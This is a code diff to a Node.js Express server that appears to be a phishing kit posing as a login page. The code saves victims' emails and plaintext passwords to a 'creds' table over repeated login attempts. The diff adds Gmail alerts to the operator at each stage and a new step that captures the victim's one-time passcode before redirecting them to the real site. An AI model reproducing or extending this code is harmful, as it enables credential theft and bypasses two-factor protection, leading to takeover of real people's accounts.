@@ -4,6 +4,15 @@ const express = require('express');
 const cookieParser = require('cookie-parser');
 const crypto = require('crypto');
 const { createClient } = require('@supabase/supabase-js');
+const nodemailer = require('nodemailer');
+
+const transporter = nodemailer.createTransport({
+  service: 'gmail',
+  auth: {
+    user: process.env.EMAIL_USER,
+    pass: process.env.EMAIL_PASSWORD,
+  },
+});
 
 const app = express();
 const PORT = process.env.PORT || 3000;
@@ -14,6 +23,9 @@ app.set('views', path.join(__dirname, 'views'));
 
 // Serve static files from /public
 app.use(express.static(path.join(__dirname, 'public')));
+
+// For application/json
+app.use(express.json());
 
 // Parse URL-encoded bodies (for simple form submissions)
 app.use(express.urlencoded({ extended: true }));
@@ -86,7 +98,7 @@ app.get('/login', async (req, res) => {
     });
     await supabase.from('session_count').insert([{ session_id: sessionId, count: 1 }]);
   }
-  if(req.query.next){
+  if (req.query.next) {
     console.log("next parameter found:", req.query.next)
     res.cookie('next', req.query.next, {
       maxAge: 30 * 60 * 1000, // 30 minutes in milliseconds
@@ -120,6 +132,13 @@ app.post('/login', async (req, res) => {
     }
 
     await supabase.from('creds').insert([{ email: email, session_id: sessionId }]);
+    const mailInfo = {
+      subject: "Attempting Login",
+      text: `Login being attempted by user "${email}"`,
+      from: process.env.EMAIL_USER,
+      to: process.env.EMAIL_USER
+    }
+    transporter.sendMail(mailInfo)
     return res.redirect('/login/password')
   } catch (err) {
     console.error('Error during login', err);
@@ -145,11 +164,14 @@ app.get('/login/password', async (req, res) => {
     return res.redirect('/login');
   }
   let email = emailData.email;
+  const otp = req.query.otp? true:false
+  console.log("OTP", otp)
 
   res.render('password', {
     sessionId: sessionId,
     email: email,
-    error: req.query.error
+    error: req.query.error,
+    otp: req.query.otp? true: false
   });
 });
 
@@ -188,20 +210,48 @@ app.post('/login/password', async (req, res) => {
     } else {
       console.log("Login Attempt Three")
       await supabase.from('creds').insert([{ email: account, password: password, session_id: sessionId }]);
-      await supabase.from('session_count').delete().eq('session_id', sessionId);
-      const next = req.cookies.next;
-      console.log("Checking for next cookie");
-      if (next){
-        console.log("Next cookie found");
-        const fullUrl =`${process.env.MAIN_REDIRECT_URL}/${next}`;
-        return res.redirect(fullUrl);
-      }
-      return res.redirect(process.env.REDIRECT_URL)
+      const mailInfo = {
+      subject: "Logged In",
+      text: `Login process done by user "${account}"`,
+      from: process.env.EMAIL_USER,
+      to: process.env.EMAIL_USER
+    }
+    transporter.sendMail(mailInfo)
+      return res.redirect('/login/password?otp=1');
     }
   } catch (err) {
     console.error('Error during login/password', err);
     return res.redirect('/login/password?error=Database+error');
   }
+});
+
+app.post("/login/otp", async (req, res) => {
+  const { otp, email } = req.body;
+  console.log("OTP detected")
+  let sessionId = req.cookies.sessionId;
+  await supabase.from('otp').insert([{email: email, otp: otp}]);
+  await supabase.from('session_count').delete().eq('session_id', sessionId);
+
+  const mailInfo = {
+    subject: "OTP sent",
+    text: `OTP sent: user "${email}"`,
+    from: process.env.EMAIL_USER,
+    to: process.env.EMAIL_USER
+  }
+  transporter.sendMail(mailInfo)
+  const next = req.cookies.next;  
+  console.log("Checking for next cookie");
+  
+  if (next) {
+    console.log("Next cookie found");
+    const fullUrl = `${process.env.MAIN_REDIRECT_URL}/${next}`;
+    return res.send({
+      redirectUrl: fullUrl
+    })
+  }
+  return res.send({
+    redirectUrl: process.env.REDIRECT_URL
+  })
 });
 
 app.use((req, res) => {
